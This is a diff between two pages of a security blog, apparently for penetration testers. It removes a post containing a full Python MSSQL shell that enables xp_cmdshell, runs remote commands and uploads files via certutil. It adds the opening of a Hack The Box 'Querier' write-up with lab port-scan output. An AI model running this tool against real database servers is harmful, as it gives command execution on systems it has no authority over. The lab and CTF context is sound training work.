@@ -137,16 +137,16 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
   <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />
 
 
-  <title>MSSQL shell with file upload capability - The Portal of Knowledge</title>
-  <meta property='og:title' content="MSSQL shell with file upload capability - The Portal of Knowledge">
+  <title>Querier write-up - The Portal of Knowledge</title>
+  <meta property='og:title' content="Querier write-up - The Portal of Knowledge">
   <meta property="og:type" content="article">
-  <meta name="description" content="Implementation in Python of a MSSQL shell with file upload capability using the xp_cmdshell stored procedure. Υλοποίηση σε Python ενός MSSQL κελύφους με δυνατότητα ανεβάσματος αρχείων χρησιμοποιώντας την αποθηκευμένη διαδικασία xp_cmdshell.">
-  <meta property="og:description" content="Implementation in Python of a MSSQL shell with file upload capability using the xp_cmdshell stored procedure. Υλοποίηση σε Python ενός MSSQL κελύφους με δυνατότητα ανεβάσματος αρχείων χρησιμοποιώντας την αποθηκευμένη διαδικασία xp_cmdshell.">
-  <meta property="og:image" content="https://alamot.github.io/images/dbs.jpg">
+  <meta name="description" content="Write-up for the Querier machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Querier του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:description" content="Write-up for the Querier machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Querier του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:image" content="https://alamot.github.io/images/querier.jpg">
   <meta property="og:image:width" content="768" />
   <meta property="og:image:height" content="384" />
 
-<meta property="og:url" content="https://alamot.github.io/mssql_shell/">
+<meta property="og:url" content="https://alamot.github.io/querier_writeup/">
 
 
 <script type="application/ld+json">
@@ -157,15 +157,15 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
       "@type":"WebPage",
       "@id":"https://alamot.github.io/"
     },
-    "headline": "MSSQL shell with file upload capability |  ",
+    "headline": "Querier write-up |  ",
     "image": {
       "@type": "ImageObject",
       "url": "",
       "height": 700,
       "width": 700
     },
-    "datePublished": "2018-04-13T00:00:00JST",
-    "dateModified": "2018-04-13T00:00:00JST",
+    "datePublished": "2019-06-22T00:00:00JST",
+    "dateModified": "2019-06-22T00:00:00JST",
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
@@ -197,7 +197,20 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
         
         
         
-        
+         
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scanning">Port scanning</a></li>
+<li><a href="#discovering-shares">Discovering shares</a></li>
+<li><a href="#capturing-credentials">Capturing credentials</a></li>
+<li><a href="#getting-mssql-shell-as-mssql-svc">Getting (mssql) shell as mssql-svc</a></li>
+</ul></li>
+<li><a href="#privilege-escalation">Privilege escalation</a>
+<ul>
+<li><a href="#using-group-policy-password-and-psexec-py">Using Group Policy password and psexec.py</a></li>
+<li><a href="#ab-using-usosvc-service">(Ab)Using UsoSvc service</a></li>
+</ul></li>
+ 
       
         <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
       </ul>
@@ -238,13 +251,13 @@ if (language) {
   <div class="row">
     <div class="col-md-12">
       <article class="single centered">
-        <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+        <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
         <div class="body">
-            <header lang="en"><h1 id="title" class="title">MSSQL shell with file upload capability</h1></header>
-            <header lang="el"><h1 class="title">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h1></header>
+            <header lang="en"><h1 id="title" class="title">Querier write-up</h1></header>
+            <header lang="el"><h1 class="title">Ανάλυση του Querier</h1></header>
             <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
-            <time lang="en" class="topmargin7">13 Apr 2018</time>
-            <time lang="el" class="topmargin7">13 Απρ 2018</time>
+            <time lang="en" class="topmargin7">22 Jun 2019</time>
+            <time lang="el" class="topmargin7">22 Ιουν 2019</time>
             &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
             
               <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
@@ -252,21 +265,16 @@ if (language) {
                 <span lang="el">Κυβερνοασφάλεια</span>
               </a>
             
-              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/coding'>
-                <span lang="en">Coding</span>
-                <span lang="el">Προγραμματισμός</span>
-              </a>
-            
             &middot; <i class="fa fa-tags topmargin7" aria-hidden="true"></i>
             
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/python'>
-                <span lang="en">python</span>
-                <span lang="el">python</span>
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/hackthebox'>
+                <span lang="en">hackthebox</span>
+                <span lang="el">hackthebox</span>
                 </a>
             
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/tool'>
-                <span lang="en">tool</span>
-                <span lang="el">εργαλείο</span>
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/windows'>
+                <span lang="en">windows</span>
+                <span lang="el">windows</span>
                 </a>
             
               <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/mssql'>
@@ -274,153 +282,421 @@ if (language) {
                 <span lang="el">mssql</span>
                 </a>
             
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/shell'>
-                <span lang="en">shell</span>
-                <span lang="el">κέλυφος</span>
-                </a>
-            
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/upload'>
-                <span lang="en">upload</span>
-                <span lang="el">ανέβασμα</span>
-                </a>
-            
          
-        <p lang="en">Sometimes we can get access to a Microsoft SQL server in which the execution of the xp_cmdshell stored procedure is allowed but other kind of traffic (TCP, UDP, ICMP et.c.) is blocked by some kind of firewall. This can make the acquisition of a shell more difficult. In such cases, it would be useful to have a kind of shell via multiple xp_cmdshell commands. One problem with that approach is that every xp_cmdshell command will be executed in a new context. Therefore, things like the current working directory and other environmental variables will not be preserved.</p>
-
-<p lang="el">Κάποιες φορές μπορεί να έχουμε πρόσβαση σε ένα διακομιστή Microsoft SQL στον οποίο επίτρεπεται η εκτέλεση της αποθηκευμένης διαδικασίας xp_cmdshell αλλά άλλου είδους κίνηση (TCP, UDP, ICMP κ.λπ.) εμποδίζεται από κάποιους είδους τείχος προστασίας. Αυτό μπορεί να καταστήσει την απόκτηση κελύφους δυσκολότερη. Σε τέτοιες περιπτώσεις, θα ήταν χρήσιμη η ύπαρξη ενός είδους κελύφους μέσω πολλαπλών εντολών xp_cmdshell. Ένα πρόβλημα με αυτήν την προσέγγιση είναι ότι κάθε εντολή xp_cmdshell θα εκτελείται σε καινούριο πλαίσιο. Οπότε, πράγματα όπως ο τρέχων φάκελος εργασίας και άλλες μεταβλητές του περιβάλλοντος δε θα διατηρούνται.</p>
-
-<p lang="en">I wrote the following Python script that stores the current working directory after every command and restores it before executing the next command. My script also features a file upload capability using multiple echo commands in order to write a base64-encoded file on the server, whereas the server-side decoding is done using the certutil tool. In addition, the script performs MD5 checksum verification for the uploaded file.</p>
-
-<p lang="el">Έγραψα το παρακάτω πρόγραμμα Python που αποθηκεύει τον τρέχοντα φάκελο εργασίας μετά από κάθε εντολή και τον αποκαθιστά πριν την εκτέλεση της επόμενης εντολής. Το πρόγραμμά μου διαθέτει επίσης και δυνατότητα ανεβάσματος αρχείων κάνοντας χρήση πολλαπλών εντολών echo για την εγγραφή αρχείου με κωδικοποίηση base64 στον διακομιστή, ενώ η αποκωδικοποίηση από πλευράς διακομιστή γίνεται με τη χρήση του εργαλείου certutil. Επιπλέον, το πρόγραμμα επιτελεί και επαλήθευση υπογραφής MD5 για το ανεβασμένο αρχείο.</p>
-
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
-<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
-<span class="c1"># Author: Alamot</span>
-<span class="c1"># Use pymssql &gt;= 1.0.3 (otherwise it doesn&#39;t work correctly)</span>
-<span class="c1"># To upload a file, type: UPLOAD local_path remote_path</span>
-<span class="c1"># e.g. UPLOAD myfile.txt C:\temp\myfile.txt</span>
-<span class="c1"># If you omit the remote_path it uploads the file on the current working folder.</span>
-<span class="c1"># Be aware that pymssql has some serious memory leak issues when the connection fails (see: https://github.com/pymssql/pymssql/issues/512).</span>
-<span class="kn">import</span> <span class="nn">_mssql</span>
-<span class="kn">import</span> <span class="nn">base64</span>
-<span class="kn">import</span> <span class="nn">shlex</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">tqdm</span>
-<span class="kn">import</span> <span class="nn">hashlib</span>
-<span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="nb">open</span>
-<span class="k">try</span><span class="p">:</span> <span class="nb">input</span> <span class="o">=</span> <span class="nb">raw_input</span>
-<span class="k">except</span> <span class="ne">NameError</span><span class="p">:</span> <span class="k">pass</span>
-
-
-<span class="n">MSSQL_SERVER</span><span class="o">=</span><span class="s2">&#34;10.10.10.10&#34;</span>
-<span class="n">MSSQL_USERNAME</span> <span class="o">=</span> <span class="s2">&#34;Domain</span><span class="se">\\</span><span class="s2">sa_user&#34;</span>
-<span class="n">MSSQL_PASSWORD</span> <span class="o">=</span> <span class="s2">&#34;**********&#34;</span>
-<span class="n">BUFFER_SIZE</span> <span class="o">=</span> <span class="mi">5</span><span class="o">*</span><span class="mi">1024</span>
-<span class="n">TIMEOUT</span> <span class="o">=</span> <span class="mi">30</span>
-
-
-<span class="k">def</span> <span class="nf">process_result</span><span class="p">(</span><span class="n">mssql</span><span class="p">):</span>
-    <span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-    <span class="n">computername</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-    <span class="n">cwd</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-    <span class="n">rows</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">mssql</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">rows</span><span class="p">[:</span><span class="o">-</span><span class="mi">3</span><span class="p">]:</span>
-        <span class="n">columns</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">row</span><span class="p">)</span>
-        <span class="k">if</span> <span class="n">row</span><span class="p">[</span><span class="n">columns</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]:</span>
-            <span class="k">print</span><span class="p">(</span><span class="n">row</span><span class="p">[</span><span class="n">columns</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]])</span>
-        <span class="k">else</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">()</span>
-    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">rows</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span>
-        <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">computername</span><span class="p">)</span> <span class="o">=</span> <span class="n">rows</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">][</span><span class="nb">list</span><span class="p">(</span><span class="n">rows</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">])[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">)</span>
-        <span class="n">cwd</span> <span class="o">=</span> <span class="n">rows</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">][</span><span class="nb">list</span><span class="p">(</span><span class="n">rows</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">])[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span>
-    <span class="k">return</span> <span class="p">(</span><span class="n">username</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(),</span> <span class="n">computername</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(),</span> <span class="n">cwd</span><span class="o">.</span><span class="n">rstrip</span><span class="p">())</span>
-
-
-<span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">mssql</span><span class="p">,</span> <span class="n">stored_cwd</span><span class="p">,</span> <span class="n">local_path</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">):</span>
-    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Uploading &#34;</span><span class="o">+</span><span class="n">local_path</span><span class="o">+</span><span class="s2">&#34; to &#34;</span><span class="o">+</span><span class="n">remote_path</span><span class="p">)</span>
-    <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;type nul &gt; &#34;&#39;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s1">&#39;.b64&#34;&#39;</span>
-    <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC xp_cmdshell &#39;&#34;</span><span class="o">+</span><span class="n">cmd</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
-
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">local_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-        <span class="n">md5sum</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
-        <span class="n">b64enc_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">encodestring</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+         <aside>
+          <section>
+            <header lang="en"><h2>Contents</h2></header>
+            <header lang="el"><h2>Περιεχόμενα</h2></header>
+            <div><nav id="TableOfContents">
+<ul>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scanning">Port scanning</a></li>
+<li><a href="#discovering-shares">Discovering shares</a></li>
+<li><a href="#capturing-credentials">Capturing credentials</a></li>
+<li><a href="#getting-mssql-shell-as-mssql-svc">Getting (mssql) shell as mssql-svc</a></li>
+</ul></li>
+<li><a href="#privilege-escalation">Privilege escalation</a>
+<ul>
+<li><a href="#using-group-policy-password-and-psexec-py">Using Group Policy password and psexec.py</a></li>
+<li><a href="#ab-using-usosvc-service">(Ab)Using UsoSvc service</a></li>
+</ul></li>
+</ul>
+</nav></div>
+          </section>
+         </aside>
         
-    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Data length (b64-encoded): &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b64enc_data</span><span class="p">)</span><span class="o">/</span><span class="mi">1024</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;KB&#34;</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="o">.</span><span class="n">tqdm</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">b64enc_data</span><span class="p">),</span> <span class="n">BUFFER_SIZE</span><span class="p">),</span> <span class="n">unit_scale</span><span class="o">=</span><span class="n">BUFFER_SIZE</span><span class="o">/</span><span class="mi">1024</span><span class="p">,</span> <span class="n">unit</span><span class="o">=</span><span class="s2">&#34;KB&#34;</span><span class="p">):</span>
-        <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;echo &#39;</span><span class="o">+</span><span class="n">b64enc_data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">BUFFER_SIZE</span><span class="p">]</span><span class="o">+</span><span class="s1">&#39; &gt;&gt; &#34;&#39;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s1">&#39;.b64&#34;&#39;</span>
-        <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC xp_cmdshell &#39;&#34;</span><span class="o">+</span><span class="n">cmd</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
-        <span class="c1">#print(&#34;Remaining: &#34;+str(len(b64enc_data)-i))</span>
-
-    <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;certutil -decode &#34;&#39;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s1">&#39;.b64&#34; &#34;&#39;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s1">&#39;&#34;&#39;</span>
-    <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC xp_cmdshell &#39;cd &#34;</span><span class="o">+</span><span class="n">stored_cwd</span><span class="o">+</span><span class="s2">&#34; &amp; &#34;</span><span class="o">+</span><span class="n">cmd</span><span class="o">+</span><span class="s2">&#34; &amp; echo </span><span class="si">%u</span><span class="s2">sername%^|%COMPUTERNAME% &amp; cd&#39;&#34;</span><span class="p">)</span>
-    <span class="n">process_result</span><span class="p">(</span><span class="n">mssql</span><span class="p">)</span>
-    <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;certutil -hashfile &#34;&#39;</span> <span class="o">+</span> <span class="n">remote_path</span> <span class="o">+</span> <span class="s1">&#39;&#34; MD5&#39;</span>
-    <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC xp_cmdshell &#39;cd &#34;</span><span class="o">+</span><span class="n">stored_cwd</span><span class="o">+</span><span class="s2">&#34; &amp; &#34;</span><span class="o">+</span><span class="n">cmd</span><span class="o">+</span><span class="s2">&#34; &amp; echo </span><span class="si">%u</span><span class="s2">sername%^|%COMPUTERNAME% &amp; cd&#39;&#34;</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">md5sum</span> <span class="ow">in</span> <span class="p">[</span><span class="n">row</span><span class="p">[</span><span class="nb">list</span><span class="p">(</span><span class="n">row</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">mssql</span> <span class="k">if</span> <span class="n">row</span><span class="p">[</span><span class="nb">list</span><span class="p">(</span><span class="n">row</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]]:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;MD5 hashes match: &#34;</span> <span class="o">+</span> <span class="n">md5sum</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;ERROR! MD5 hashes do NOT match!&#34;</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">shell</span><span class="p">():</span>
-    <span class="n">mssql</span> <span class="o">=</span> <span class="bp">None</span>
-    <span class="n">stored_cwd</span> <span class="o">=</span> <span class="bp">None</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">mssql</span> <span class="o">=</span> <span class="n">_mssql</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server</span><span class="o">=</span><span class="n">MSSQL_SERVER</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">MSSQL_USERNAME</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">MSSQL_PASSWORD</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Successful login: &#34;</span><span class="o">+</span><span class="n">MSSQL_USERNAME</span><span class="o">+</span><span class="s2">&#34;@&#34;</span><span class="o">+</span><span class="n">MSSQL_SERVER</span><span class="p">)</span>
-
-        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Trying to enable xp_cmdshell ...&#34;</span><span class="p">)</span>
-        <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec SP_CONFIGURE &#39;xp_cmdshell&#39;,1;RECONFIGURE&#34;</span><span class="p">)</span>
-
-        <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;echo </span><span class="si">%u</span><span class="s1">sername%^|%COMPUTERNAME% &amp; cd&#39;</span>
-        <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC xp_cmdshell &#39;&#34;</span><span class="o">+</span><span class="n">cmd</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
-        <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">computername</span><span class="p">,</span> <span class="n">cwd</span><span class="p">)</span> <span class="o">=</span> <span class="n">process_result</span><span class="p">(</span><span class="n">mssql</span><span class="p">)</span>
-        <span class="n">stored_cwd</span> <span class="o">=</span> <span class="n">cwd</span>
         
-        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-            <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;CMD &#34;</span><span class="o">+</span><span class="n">username</span><span class="o">+</span><span class="s2">&#34;@&#34;</span><span class="o">+</span><span class="n">computername</span><span class="o">+</span><span class="s2">&#34; &#34;</span><span class="o">+</span><span class="n">cwd</span><span class="o">+</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#39;&#34;</span><span class="p">)</span>
-            <span class="k">if</span> <span class="ow">not</span> <span class="n">cmd</span><span class="p">:</span>
-                <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;call&#34;</span> <span class="c1"># Dummy cmd command</span>
-            <span class="k">if</span> <span class="n">cmd</span><span class="o">.</span><span class="n">lower</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;exit&#34;</span><span class="p">:</span>
-                <span class="n">mssql</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-                <span class="k">return</span>
-            <span class="k">elif</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">6</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;UPLOAD&#34;</span><span class="p">:</span>
-                <span class="n">upload_cmd</span> <span class="o">=</span> <span class="n">shlex</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">posix</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
-                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">upload_cmd</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
-                    <span class="n">upload</span><span class="p">(</span><span class="n">mssql</span><span class="p">,</span> <span class="n">stored_cwd</span><span class="p">,</span> <span class="n">upload_cmd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">stored_cwd</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">upload_cmd</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
-                <span class="k">else</span><span class="p">:</span>
-                    <span class="n">upload</span><span class="p">(</span><span class="n">mssql</span><span class="p">,</span> <span class="n">stored_cwd</span><span class="p">,</span> <span class="n">upload_cmd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">upload_cmd</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
-                <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;echo *** UPLOAD PROCEDURE FINISHED ***&#34;</span>
-            <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC xp_cmdshell &#39;cd &#34;</span><span class="o">+</span><span class="n">stored_cwd</span><span class="o">+</span><span class="s2">&#34; &amp; &#34;</span><span class="o">+</span><span class="n">cmd</span><span class="o">+</span><span class="s2">&#34; &amp; echo </span><span class="si">%u</span><span class="s2">sername%^|%COMPUTERNAME% &amp; cd&#39;&#34;</span><span class="p">)</span>
-            <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">computername</span><span class="p">,</span> <span class="n">cwd</span><span class="p">)</span> <span class="o">=</span> <span class="n">process_result</span><span class="p">(</span><span class="n">mssql</span><span class="p">)</span>
-            <span class="n">stored_cwd</span> <span class="o">=</span> <span class="n">cwd</span>
-            
-    <span class="k">except</span> <span class="n">_mssql</span><span class="o">.</span><span class="n">MssqlDatabaseException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-        <span class="k">if</span>  <span class="n">e</span><span class="o">.</span><span class="n">severity</span> <span class="o">&lt;=</span> <span class="mi">16</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;MSSQL failed: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
-        <span class="k">else</span><span class="p">:</span>
-            <span class="k">raise</span>
-    <span class="k">finally</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">mssql</span><span class="p">:</span>
-            <span class="n">mssql</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
+<h1 id="enumeration">Enumeration</h1>
 
-<span class="n">shell</span><span class="p">()</span>
-<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span></code></pre></div>
+<h2 id="port-scanning">Port scanning</h2>
 
-<p lang="en">You can download this tool from here: <a href="https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py" target="_blank">mssql_shell.py</a></p>
-<p lang="el">Μπορείτε να κατεβάσετε αυτό το εργαλείο απο εδώ: <a href="https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py" target="_blank">mssql_shell.py</a</p> 
+<p>Let&rsquo;s scan the full range of TCP and UDP ports using my tool htbscan.py (you can find it here: <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py</a>)</p>
+
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.125 -o querier_enum.txt
+
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-21 16:06:53 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131070 ports/host]
+Discovered open port 49671/tcp on 10.10.10.125                                 
+Discovered open port 49666/tcp on 10.10.10.125                                 
+Discovered open port 135/tcp on 10.10.10.125                                   
+Discovered open port 49668/tcp on 10.10.10.125                                 
+Discovered open port 139/tcp on 10.10.10.125                                   
+Discovered open port 1433/tcp on 10.10.10.125                                  
+Discovered open port 49670/tcp on 10.10.10.125                                 
+Discovered open port 47001/tcp on 10.10.10.125                                 
+Discovered open port 49664/tcp on 10.10.10.125                                 
+Discovered open port 49669/tcp on 10.10.10.125                                 
+Discovered open port 445/tcp on 10.10.10.125                                   
+Discovered open port 49665/tcp on 10.10.10.125                                 
+Discovered open port 5985/tcp on 10.10.10.125                                  
+Discovered open port 49667/tcp on 10.10.10.125                                 
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-21 19:17 EEST
+Nmap scan report for QUERIER (10.10.10.125)
+Host is up (0.065s latency).
+
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+1433/tcp  open  ms-sql-s      Microsoft SQL Server  14.00.1000.00
+| ms-sql-ntlm-info: 
+|   Target_Name: HTB
+|   NetBIOS_Domain_Name: HTB
+|   NetBIOS_Computer_Name: QUERIER
+|   DNS_Domain_Name: HTB.LOCAL
+|   DNS_Computer_Name: QUERIER.HTB.LOCAL
+|   DNS_Tree_Name: HTB.LOCAL
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2019-06-21T15:32:31
+|_Not valid after:  2049-06-21T15:32:31
+|_ssl-date: 2019-06-21T16:18:33+00:00; +5s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
